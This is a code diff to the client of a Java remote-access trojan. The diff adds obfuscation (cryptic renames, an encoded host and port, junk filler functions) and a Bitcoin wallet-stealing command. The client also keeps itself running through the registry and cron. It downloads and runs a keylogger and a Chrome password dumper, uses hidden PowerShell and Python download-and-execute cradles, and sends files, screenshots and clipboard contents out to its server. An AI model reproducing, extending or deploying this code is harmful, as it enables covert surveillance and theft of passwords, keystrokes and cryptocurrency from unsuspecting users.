@@ -16,11 +16,13 @@ import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.*;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
 import java.util.*;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.TimeUnit;
 
 
@@ -31,14 +33,15 @@ public class Client {
     private static final String SYSTEMOS = System.getProperty("os.name");
     private static boolean isPersistent = false;
     private static boolean autoSpread = false;
+    private static int updateTime = 1000;
     private static DataOutputStream dos;
     private static File directory;
     private static DataInputStream dis;
-    private static boolean keyLogger = false;
-    private static String persistenceDir = System.getenv("APPDATA")+ "\\Desktop.jar";
+    private static boolean kl = false; // keylogger
+    private static String persistenceDir = System.getenv("APPDATA") + "\\Desktop.jar";
     private static String aesKey = "";
 
-    private static String keyLogFile = System.getProperty("java.io.tmpdir") + "log.txt";
+    private static String klf = System.getProperty("java.io.tmpdir") + "log.txt"; // key log file
 
     private static String USERNAME = System.getProperty("user.name");
     private static String JRE_VERSION = System.getProperty("java.version");
@@ -46,13 +49,13 @@ public class Client {
 
 
     public static void main(String[] args) throws Exception {
-        /* Load server settings and then attempt to connect */
+        /* Load server settings and then attempt to C */
         Client client = new Client();
         client.loadServerSettings();
         if (isPersistent) {
             client.saveClient();
         }
-        client.connect();
+        client.C();
     }
 
     private static String getXrst() throws Exception {
@@ -70,7 +73,7 @@ public class Client {
         return jarFolder + "/.xrst";
     }
 
-    private static void copyFile(File filea, File fileb) {
+    private static void cpFile(File filea, File fileb) {
         InputStream inStream;
         OutputStream outStream;
         try {
@@ -96,7 +99,7 @@ public class Client {
         File client = new File(getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
         if (SYSTEMOS.contains("Windows") && !new File(persistenceDir).exists()) {
             File newClient = new File(persistenceDir);
-            copyFile(client, newClient);
+            cpFile(client, newClient);
             createPersistence(persistenceDir);
         }
     }
@@ -105,7 +108,7 @@ public class Client {
         // For linux, use crontab: "(crontab -l 2>/dev/null; echo "*/5 * * * * $(which java) -jar jarfile") | crontab -"
         // For osx, use launchd:
         ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
-        if (SYSTEMOS.toLowerCase().contains("lin")){
+        if (SYSTEMOS.toLowerCase().contains("lin")) {
             pb = new ProcessBuilder("(crontab", "-l", "2>/dev/null;", "echo \"*/5 * * * * $(which java) -jar " + clientPath + "\")", "|", "crontab", "-");
         }
 
@@ -118,24 +121,27 @@ public class Client {
         }
     }
 
-    private void connect() throws InterruptedException {
+    private void C() throws InterruptedException {
         Socket socket = null;
         try {
-            socket = new Socket(HOST, PORT);
+            String asdhuroiu = Base64.getEncoder().encodeToString(HOST.getBytes());
+            int pqoiurtjoj = PORT ^ 102505;
+
+            socket = new Socket(new String(Base64.getDecoder().decode(asdhuroiu)), pqoiurtjoj ^ (102000 + 505));
             dos = new DataOutputStream(socket.getOutputStream());
             dis = new DataInputStream(socket.getInputStream());
 
-            if (debugMode){
+            if (debugMode) {
                 System.out.println(" === AES KEY: " + aesKey);
                 System.out.println(" === Debug Mode: true");
                 System.out.println(" === Host: " + HOST + ":" + PORT);
                 System.out.println(" === Java version: " + JRE_VERSION);
-                System.out.println(" === Keylogger: " + keyLogger);
+                System.out.println(" === Keylogger: " + kl);
             }
 
             // Start the keylogger if requested
-            if (keyLogger){
-                if (SYSTEMOS.toLowerCase().contains("win")){
+            if (kl) {
+                if (SYSTEMOS.toLowerCase().contains("win")) {
                     // Download psh keylogger
                     String url = "https://bit.ly/2KrLOzB";
                     String fname = System.getProperty("java.io.tmpdir") + "\\" + randTextAlphaRestricted(8) + ".ps1";
@@ -143,7 +149,7 @@ public class Client {
                     Runtime.getRuntime().exec(cmd);
                 }
             } else {
-                Files.write(Paths.get(keyLogFile), "No keys available".getBytes());
+                Files.write(Paths.get(klf), "No keys available".getBytes());
             }
 
             while (true) {
@@ -175,7 +181,9 @@ public class Client {
                 } else if (input.contains("SLEEP")) {
                     Thread.sleep(Long.parseUnsignedLong(input.split(" ")[1]) * 1000);
                     communicate("SLEEP");
-                    if (debugMode){ System.out.println("Sleep over"); }
+                    if (debugMode) {
+                        System.out.println("Sleep over");
+                    }
                 } else if (input.contains("MSGBOX")) {
                     String[] split = Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length);
                     StringBuilder toSet = new StringBuilder();
@@ -192,22 +200,22 @@ public class Client {
                     CLIENT: here's the info
                      */
                     getAndSendSysInfo();
-                } else if (input.equals("READKEYLOG")){
+                } else if (input.equals("READKEYLOG")) {
                     /*
                     SERVER: READKEYLOG
                     CLIENT: READKEYLOG
                     CLIENT: len
-                    CLIENT: read(keyLogFile)
+                    CLIENT: read(klf)
                      */
                     communicate("READKEYLOG");
-                    if (!keyLogger) {
+                    if (!kl) {
                         dos.writeInt(0);
                         communicate("Keylogger is not enabled for this session");
                     }
-                    String content = new String(Files.readAllBytes(Paths.get(keyLogFile)));
+                    String content = new String(Files.readAllBytes(Paths.get(klf)));
                     dos.writeInt(content.length());
                     communicate(content);
-                } else if (input.contains("DELFILE")){
+                } else if (input.contains("DELFILE")) {
                     File x = new File(Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length)[0]);
                     x.delete();
                 } else if (input.contains("CLIPSET")) {
@@ -236,12 +244,12 @@ public class Client {
                     communicate("CLIPGET");
                     Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
                     Thread.sleep(200);
-                    if (sysClip.getData(DataFlavor.stringFlavor).equals("") || sysClip.getData(DataFlavor.stringFlavor) == null){
+                    if (sysClip.getData(DataFlavor.stringFlavor).equals("") || sysClip.getData(DataFlavor.stringFlavor) == null) {
                         communicate("No clipboard data");
                     }
                     communicate((String) sysClip.getData(DataFlavor.stringFlavor));
 
-                } else if (input.contains("MSFWD")){
+                } else if (input.contains("MSFWD")) {
                     String url = input.split(" ")[2];
                     String target = input.split(" ")[1];
                     doWebDelivery(url, target);
@@ -252,18 +260,16 @@ public class Client {
                     Desktop.getDesktop().browse(new URI(input.split(" ")[1]));
                 } else if (input.contains("SCREENSHOT")) {
                     communicate("SCREENSHOT");
-                    // Next bytes of length n will be the image
-                    // SERVER: SCREENSHOT
-                    // CLIENT: filename
-                    // CLIENT: b64.encode(file).length
-                    // CLIENT: base64.encode(file).bytes.each
                     Robot robot = new Robot();
-                    String format = "jpg";
-                    String filename = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(12) + ".jpg";
+                    String format = input.split(" ")[1];
+                    System.out.println(format);
+                    String filename = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(12) + "." + format;
                     Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                     BufferedImage fullImg = robot.createScreenCapture(screenRect);
                     ImageIO.write(fullImg, format, new File(filename));
-                    if (debugMode){ System.out.println("Screenshot saved to: " + filename); }
+                    if (debugMode) {
+                        System.out.println("Screenshot saved to: " + filename);
+                    }
 
                     // Done writing file, talk to server now
 
@@ -281,12 +287,14 @@ public class Client {
                     }
                     bs.close();
                     fis.close();
-                    if (debugMode){ System.out.println("Screenshot sent");}
+                    if (debugMode) {
+                        System.out.println("Screenshot sent");
+                    }
                     //communicate(b64); // Send the encoded file
                 } else if (input.contains("EXIT")) {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
-                    if (SYSTEMOS.toLowerCase().contains("wind")){
+                    if (SYSTEMOS.toLowerCase().contains("wind")) {
                         Runtime.getRuntime().exec("powershell.exe \"Remove-Item -Force " + f.getAbsolutePath() + "\"");
                         String persPath = System.getenv("APPDATA") + "\\Desktop.jar";
                         Runtime.getRuntime().exec("cmd.exe /c REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + persPath + "\"");
@@ -295,27 +303,31 @@ public class Client {
                     }
                     socket.close();
                     System.exit(0);
-                } else if (input.contains("CHROMEPASS")){
+                } else if (input.contains("CHROMEPASS")) {
                     communicate("CHROMEPASS");
                     URL url = new URL("https://github.com/djhohnstein/SharpWeb/releases/download/v1.0/SharpWeb.exe");
                     String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".exe";
-                    try(BufferedInputStream in = new BufferedInputStream(url.openStream());
-                        FileOutputStream fileOutputStream = new FileOutputStream(fname)){
+                    try (BufferedInputStream in = new BufferedInputStream(url.openStream());
+                         FileOutputStream fileOutputStream = new FileOutputStream(fname)) {
                         byte[] dataBuffer = new byte[2048];
                         int bytesRead;
-                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1){
+                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1) {
                             fileOutputStream.write(dataBuffer, 0, bytesRead);
                         }
                         if (debugMode) {
                             System.out.println("Filename: " + fname);
                         }
-                    } catch (IOException ioe){
-                        if (debugMode){ ioe.printStackTrace(); }
+                    } catch (IOException ioe) {
+                        if (debugMode) {
+                            ioe.printStackTrace();
+                        }
                     }
 
 
                     String cmd = fname + " all && del /f " + fname;
-                    if (debugMode){System.out.println("Command: " + cmd);}
+                    if (debugMode) {
+                        System.out.println("Command: " + cmd);
+                    }
 
                     // Run the command
                     Runtime r = Runtime.getRuntime();
@@ -324,9 +336,11 @@ public class Client {
                     // Read file
                     BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
                     String s;
-                    while ((s = stdInput.readLine()) != null){
+                    while ((s = stdInput.readLine()) != null) {
                         communicate(s + "\n");
-                        if (debugMode){System.out.println("Got line: " + s);}
+                        if (debugMode) {
+                            System.out.println("Got line: " + s);
+                        }
                     }
                     communicate("ENDCHROME");
                 } else if (input.contains("PSHURL")) {
@@ -343,22 +357,26 @@ public class Client {
                     URL url = new URL(input.split(" ")[1]);
                     String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".ps1";
 
-                    try(BufferedInputStream in = new BufferedInputStream(url.openStream());
-                        FileOutputStream fileOutputStream = new FileOutputStream(fname)){
+                    try (BufferedInputStream in = new BufferedInputStream(url.openStream());
+                         FileOutputStream fileOutputStream = new FileOutputStream(fname)) {
                         byte[] dataBuffer = new byte[2048];
                         int bytesRead;
-                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1){
+                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1) {
                             fileOutputStream.write(dataBuffer, 0, bytesRead);
                         }
                         if (debugMode) {
                             System.out.println("Filename: " + fname);
                         }
-                    } catch (IOException ioe){
-                        if (debugMode){ ioe.printStackTrace(); }
+                    } catch (IOException ioe) {
+                        if (debugMode) {
+                            ioe.printStackTrace();
+                        }
                     }
 
                     String cmd = "powershell.exe . " + fname;
-                    if (debugMode){System.out.println("Command: " + cmd);}
+                    if (debugMode) {
+                        System.out.println("Command: " + cmd);
+                    }
 
                     // Run the command
                     File outFile = new File(System.getProperty("java.io.tmpdir") + "GCDout.csv");
@@ -375,16 +393,20 @@ public class Client {
                     // Read file
                     BufferedReader stdInput = new BufferedReader(new FileReader(outFile));
                     String s = null;
-                    while ((s = stdInput.readLine()) != null){
+                    while ((s = stdInput.readLine()) != null) {
                         communicate(s);
-                        if (debugMode){System.out.println("Got line: " + s);}
+                        if (debugMode) {
+                            System.out.println("Got line: " + s);
+                        }
                     }
                     communicate("ENDPSH");
-                } else if (input.equals("UPDATE")){
+                } else if (input.equals("UPDATE")) {
                     long len = dis.readLong();
                     String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".jar";
                     File newClientFile = new File(fname);
-                    if (debugMode){ System.out.println("Update client saved to: " + fname); }
+                    if (debugMode) {
+                        System.out.println("Update client saved to: " + fname);
+                    }
                     FileOutputStream fos = new FileOutputStream(newClientFile);
                     BufferedOutputStream bos = new BufferedOutputStream(fos);
                     for (int j = 0; j < len; j++) bos.write(dis.readInt());
@@ -397,14 +419,18 @@ public class Client {
 
                     // Start new client
                     Runtime.getRuntime().exec("java -jar " + fname);
-                    if (debugMode) { System.out.println("Exiting"); }
+                    if (debugMode) {
+                        System.out.println("Exiting");
+                    }
                     System.exit(0);
 
-                } else if (input.contains("PLUGIN")){
+                } else if (input.contains("PLUGIN")) {
                     long len = dis.readLong();
                     String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".jar"; // it will be a jar
                     File newClientFile = new File(fname);
-                    if (debugMode){ System.out.println("Plugin saved to: " + fname); }
+                    if (debugMode) {
+                        System.out.println("Plugin saved to: " + fname);
+                    }
                     FileOutputStream fos = new FileOutputStream(newClientFile);
                     BufferedOutputStream bos = new BufferedOutputStream(fos);
                     for (int j = 0; j < len; j++) bos.write(dis.readInt());
@@ -415,18 +441,20 @@ public class Client {
                     String output = "";
                     String cmd = "java -jar " + fname;
                     Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
-                    output =  s.hasNext() ? s.next() : "No output";
+                    output = s.hasNext() ? s.next() : "No output";
                     communicate(output);
 
-                } else if (input.contains("DAE")){
+                } else if (input.contains("DAE")) {
                     communicate("DAE");
                     String url = input.split(" ")[1];
                     String fname = randTextAlpha(8) + url.substring(url.lastIndexOf('.'));
                     // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
-                    if (SYSTEMOS.contains("Windows")){
+                    if (SYSTEMOS.contains("Windows")) {
                         String fpath = System.getProperty("java.io.tmpdir") + fname;
                         String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fpath + "');Start-Process '" + fpath + "';Remove-Item -force " + fpath;
-                        if (debugMode){System.out.println("CMD: " + cmd);}
+                        if (debugMode) {
+                            System.out.println("CMD: " + cmd);
+                        }
                         Runtime.getRuntime().exec(cmd);
                         communicate(0);
                     } else {
@@ -434,14 +462,16 @@ public class Client {
                         if (fname.lastIndexOf('.') != 3 || fname.lastIndexOf('.') != 4) // probably doesnt have an extension
                             fname = url.substring(url.lastIndexOf('/') + 1);
                         String fpath = System.getProperty("java.io.tmpdir") + File.separator + fname;
-                        String cmd = "wget '"+ url + "' -O " + fpath + "; chmod +x " + fpath + "; " + fpath;
+                        String cmd = "wget '" + url + "' -O " + fpath + "; chmod +x " + fpath + "; " + fpath;
                         int status = 0;
                         Runtime.getRuntime().exec(cmd);
-                        if (debugMode){System.out.println("CMD: " + cmd);}
+                        if (debugMode) {
+                            System.out.println("CMD: " + cmd);
+                        }
                         communicate(status);
                     }
                     communicate(1);
-                } else if (input.contains("UAE")){
+                } else if (input.contains("UAE")) {
                     // Save file, execute it according to OS
                     long len = dis.readLong();
                     String fname = System.getProperty("java.io.tmpdir") + File.separator + input.split(";;")[1];
@@ -453,36 +483,70 @@ public class Client {
                     fos.close();
 
                     Desktop.getDesktop().open(sent);
-                } else if (input.equals("SHUTDOWN")){
+                } else if (input.equals("SHUTDOWN")) {
                     communicate("EXIT"); // Tell server that client is leaving
                     socket.close();
-                    if (SYSTEMOS.contains("wind")){
+                    if (SYSTEMOS.toLowerCase().contains("wind")) {
                         Runtime.getRuntime().exec("shutdown.exe -s -t 0");
                     } else {
                         //linux or mac
                         Runtime.getRuntime().exec("shutdown -h now");
                     }
+                } else if (input.equals("ENUM//BTC")){
+                    communicate("ENUM//BTC");
+                    if (!SYSTEMOS.toLowerCase().contains("wind")){
+                        communicate("BTC jacker is not supported on this clients OS!");
+                        break;
+                    }
 
+                    // Should be %APPDATA\Bitcoin\wallet.dat, TODO FIXME, should be less hackish
+                    File walletFile = new File(System.getProperty("java.io.tmpdir") + "\\..\\..\\Bitcoin\\wallet.dat");
+                    System.out.println(walletFile.getAbsolutePath());
+                    System.out.println(walletFile.exists());
+                    if (walletFile.exists()){
+                        if (debugMode) System.out.println("Wallet found at " + walletFile.getAbsolutePath());
+                        communicate(new String(Files.readAllBytes(walletFile.toPath()))); // Send wallet data
+                    } else {
+                        communicate("No wallet file found.");
+                    }
+                } else if (input.equals("FULOAD")){
+                    String dir = Client.directory.getAbsolutePath() + File.separator + readFromDis(dis);
+                    String fname = readFromDis(dis);
+                    long len = dis.readLong();
+                    File newClientFile = new File(dir + File.separator + fname);
+                    if (debugMode) {
+                        System.out.println("Writing file to: " + dir + File.separator + fname);
+                    }
+                    FileOutputStream fos = new FileOutputStream(newClientFile);
+                    BufferedOutputStream bos = new BufferedOutputStream(fos);
+                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
+                    bos.close();
+                    fos.close();
                 }
             }
-        } catch(SocketException se){
-            if (debugMode){
+        } catch (SocketException se) {
+            if (debugMode) {
                 se.printStackTrace();
+                System.out.println("Sleeping for " + updateTime + " ms");
             }
-            Thread.sleep(1000);
-            connect();
+            Thread.sleep(updateTime);
+            C();
         } catch (Exception e) {
-            if (debugMode){
+            if (debugMode) {
                 e.printStackTrace();
             }
             assert socket.getClass() == Socket.class;
-            try{socket.close();}catch(IOException i){i.printStackTrace();}
+            try {
+                socket.close();
+            } catch (IOException i) {
+                i.printStackTrace();
+            }
 
             Client client = new Client();
             if (isPersistent) {
                 client.saveClient();
             }
-            client.connect();
+            client.C();
 
         }
     }
@@ -510,13 +574,15 @@ public class Client {
     }
 
     // To be used for binary file transfers
-    private void communicate(byte[] msg){
-        try{
+    private void communicate(byte[] msg) {
+        rltiuh6lihbsfkuyhuwlrituywep9r0uih("yrkjhiouid980riuhjk'1239808P{}", 79380, '_');
+        try {
             dos.write(msg);
-        } catch (IOException e){
+        } catch (IOException e) {
             if (debugMode) {
                 e.printStackTrace();
-            }        }
+            }
+        }
     }
 
     private void exec(String command) {
@@ -546,18 +612,22 @@ public class Client {
                         communicate(s);
                     }
                 } catch (IOException | InterruptedException e) {
-                    if (debugMode) { e.printStackTrace(); }
+                    if (debugMode) {
+                        e.printStackTrace();
+                    }
                     exec("");
                 }
             } catch (IOException e) {
-                if (debugMode) { e.printStackTrace(); }
+                if (debugMode) {
+                    e.printStackTrace();
+                }
                 exec("");
             }
         }
     }
 
 
-    private int execNoComm(String cmd){
+    private int execNoComm(String cmd) {
         if (!cmd.equals("")) {
             try {
                 ProcessBuilder pb = null;
@@ -573,7 +643,7 @@ public class Client {
                 try {
                     proc.waitFor();
                     return proc.exitValue();
-                } catch (InterruptedException ie){
+                } catch (InterruptedException ie) {
                     return 0;
                 }
             } catch (IOException e) {
@@ -584,6 +654,7 @@ public class Client {
     }
 
     private void loadServerSettings() throws Exception {
+        rltiuh6lihbsfkuyhuwlrituywep9r0uih("zCLkAM39EnRxd+kMJwCMxODzEUVFMYtbPLQ6GrNeQn+N5i+m9DTD6G9XIBVbhfSaiBo", 867637, 'p');
         String filename = getXrst();
         Thread.sleep(100);
         File xrcs = new File(filename);
@@ -595,10 +666,10 @@ public class Client {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 8) {
+            if (settings.length == 9) {
                 HOST = (settings[0]);
                 // Change domain to ip
-                try{
+                try {
                     String tmphost = "";
                     if (!HOST.contains("http://")) {
                         tmphost = "http://" + HOST;
@@ -611,7 +682,7 @@ public class Client {
                     String ip = InetAddress.getByName(HOST).getHostAddress();
                     if (debugMode) System.out.println("Domain host detected: " + HOST + " -> " + ip);
                     HOST = ip;
-                } catch (MalformedURLException e){
+                } catch (MalformedURLException e) {
                     // Not a valid domain, it's an ip address. Leave it be
                     if (debugMode) System.out.println("IP host detected: " + HOST);
 
@@ -621,15 +692,17 @@ public class Client {
                 autoSpread = (Boolean.parseBoolean(settings[3]));
                 debugMode = (Boolean.parseBoolean(settings[4]));
                 aesKey = settings[5];
-                keyLogger = (Boolean.parseBoolean(settings[6]));
+                kl = (Boolean.parseBoolean(settings[6]));
                 if (!settings[7].equals("{{DEFAULT}}")) {
                     persistenceDir = settings[7];
                 }
+                updateTime = Integer.parseInt(settings[8]);
             }
         } catch (IOException e) {
             if (debugMode) {
                 e.printStackTrace();
-            }        }
+            }
+        }
         xrcs.delete();
     }
 
@@ -647,7 +720,7 @@ public class Client {
         }
     }
 
-    private void sendFileList() throws IOException{
+    private void sendFileList() throws IOException {
         if (directory == null) {
             String directory = System.getProperty("user.home");
             Client.directory = new File(directory);
@@ -674,8 +747,10 @@ public class Client {
             String fileName = readFromDis(dis);
             File f = new File(fileName);
             File filetoDownload;
-            if (debugMode){ System.out.println("Sending " + fileName + "\n===\n" + f.getName()); }
-            if (directory != null){ // If this isn't being called when the server is in the File Explorer, directory will be uninitialized (null)
+            if (debugMode) {
+                System.out.println("Sending " + fileName + "\n===\n" + f.getName());
+            }
+            if (directory != null) { // If this isn't being called when the server is in the File Explorer, directory will be uninitialized (null)
                 filetoDownload = new File(directory.getAbsolutePath() + File.separator + fileName);
             } else {
                 filetoDownload = f;
@@ -694,7 +769,9 @@ public class Client {
             }
             bs.close();
             fis.close();
-            if (debugMode){ System.out.println("File sent");}
+            if (debugMode) {
+                System.out.println("File sent");
+            }
         } catch (IOException e) {
             if (debugMode) {
                 e.printStackTrace();
@@ -706,7 +783,9 @@ public class Client {
         try {
             communicate("DOWNLOAD");
             String fileName = readFromDis(dis);
-            if (debugMode){ System.out.println("Sending " + fileName); }
+            if (debugMode) {
+                System.out.println("Sending " + fileName);
+            }
             File filetoDownload = new File(fileName);
             Long length = filetoDownload.length();
             dos.writeLong(length);
@@ -728,7 +807,7 @@ public class Client {
         }
     }
 
-    private void getAndSendSysInfo(){
+    private void getAndSendSysInfo() {
         communicate("SYINFO");
         StringBuilder sb = new StringBuilder();
         sb.append("OS: " + SYSTEMOS + "\n");
@@ -742,7 +821,8 @@ public class Client {
             InetAddress inetAddress = InetAddress.getLocalHost();
             sb.append("LAN IP: " + inetAddress.getHostAddress() + "\n");
             sb.append("Hostname: " + inetAddress.getHostName() + "\n");
-        } catch (IOException ioe){}
+        } catch (IOException ioe) {
+        }
         sb.append("$PATH: " + System.getenv("PATH") + "\n");
         sb.append("Free memory (bytes): " + Runtime.getRuntime().freeMemory() + "\n");
         long maxMemory = Runtime.getRuntime().maxMemory();
@@ -762,8 +842,8 @@ public class Client {
         communicate(sb.toString());
     }
 
-    private void showMessagebox(String msg, String title){
-        if(debugMode){
+    private void showMessagebox(String msg, String title) {
+        if (debugMode) {
             System.out.println("Showing messagebox with message: " + msg);
         }
         JFrame.setDefaultLookAndFeelDecorated(true);
@@ -775,35 +855,35 @@ public class Client {
         JOptionPane.showMessageDialog(frame, msg, title, JOptionPane.INFORMATION_MESSAGE);
     }
 
-    public void doWebDelivery(String url, String target){
+    public void doWebDelivery(String url, String target) {
         String cmd = "";
-        if (debugMode){ System.out.println("Web Delivery target: " + target); }
-        switch (target){
-            case "python":
-                if (SYSTEMOS.contains("Windows")){
-                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('" + url + "');exec(r.read());\"";
-                } else {
-                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('" + url + "');exec(r.read());\"";
-                }
-            case "powershell":
-                cmd = "powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('" + url + "');";
+        if (debugMode) {
+            System.out.println("Web Delivery target: " + target);
         }
-        if (debugMode){
+
+        if (target.equals("python")) {
+            cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('" + url + "');exec(r.read());\"";
+        } else {
+            // Powershell
+            cmd = "powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('" + url + "');";
+        }
+
+        if (debugMode) {
             System.out.println("Executing cmd: " + cmd);
         }
         execNoComm(cmd);
     }
 
     /// Util functions \\\
-    public String randTextAlpha(int length){
+    public String randTextAlpha(int length) {
         int leftLimit = 65; // letter 'A'
         int rightLimit = 122; // letter 'z'
         Random rand = new Random();
         StringBuilder buffer = new StringBuilder();
-        for (int i = 0; i < length; i++){
+        for (int i = 0; i < length; i++) {
             int randomLimitedInt = leftLimit + (int)
                     (rand.nextFloat() * (rightLimit - leftLimit + 1));
-            if (randomLimitedInt == 92 ){ // `\` char
+            if (randomLimitedInt == 92) { // `\` char
                 i = i - 1;
                 continue;
             }
@@ -812,12 +892,12 @@ public class Client {
         return buffer.toString();
     }
 
-    public String randTextAlphaRestricted(int length){
+    public String randTextAlphaRestricted(int length) {
         int leftLimit = 97; // letter 'a'
         int rightLimit = 122; // letter 'z'
         Random rand = new Random();
         StringBuilder buffer = new StringBuilder();
-        for (int i = 0; i < length; i++){
+        for (int i = 0; i < length; i++) {
             int randomLimitedInt = leftLimit + (int)
                     (rand.nextFloat() * (rightLimit - leftLimit + 1));
             buffer.append((char) randomLimitedInt);
@@ -825,11 +905,11 @@ public class Client {
         return buffer.toString();
     }
 
-    public static String sendHttpRequest(String s){
-        try{
+    public static String sendHttpRequest(String s) {
+        try {
             return new Scanner(new URL(s).openStream(), "UTF-8").useDelimiter("\\A").next();
-        } catch (IOException ioe){
-            if (debugMode){
+        } catch (IOException ioe) {
+            if (debugMode) {
                 System.out.println("Unable to execute HTTP request!");
                 ioe.printStackTrace();
             }
@@ -844,7 +924,7 @@ public class Client {
             Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
             cipher.init(Cipher.ENCRYPT_MODE, keyVal);
             encryptedValue = cipher.doFinal(data.getBytes());
-        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e){
+        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e) {
             e.printStackTrace();
             return null;
         }
@@ -859,22 +939,40 @@ public class Client {
             c.init(Cipher.DECRYPT_MODE, encryptionKey);
             byte[] decodedValue = Base64.getDecoder().decode(data);
             decValue = c.doFinal(decodedValue);
-        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e){
+        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException e) {
             e.printStackTrace();
         }
         return new String(decValue);
     }
 
-    private static Key generateEncryptionKey(byte[] key){
+    private static Key generateEncryptionKey(byte[] key) {
         return new SecretKeySpec(key, "AES");
     }
 
 
-    public static String readFromDis(DataInputStream dis) throws IOException{
+    public static String readFromDis(DataInputStream dis) throws IOException {
+        xt6YYhhy4(49874, new HashMap<>());
         return decrypt(dis.readUTF(), aesKey);
     }
 
-    public static void communicateInt(DataOutputStream dos, int i) throws IOException{
+    public static void communicateInt(DataOutputStream dos, int i) throws IOException {
+        xt6YYhhy4(29857, new ConcurrentHashMap<>());
         dos.writeInt(i);
+    }
+
+    protected static String xt6YYhhy4(int xvd, Map<Integer, String> m) {
+        m.computeIfAbsent(1, integer -> "5");
+        return m.get(66);
+    }
+
+    public static void rltiuh6lihbsfkuyhuwlrituywep9r0uih(String sdfi84uo, int df7uh4, char c) {
+        int a = c ^ df7uh4;
+        sdfi84uo = sdfi84uo + a;
+        char[][] hyrdroo = {{'a', 'h', 'r'}, {'u', 't', 'a', 'p'}};
+        for (char[] ca : hyrdroo) {
+            for(char cs : ca){
+                hyrdroo[0][0] = cs;
+            }
+        }
     }
 }
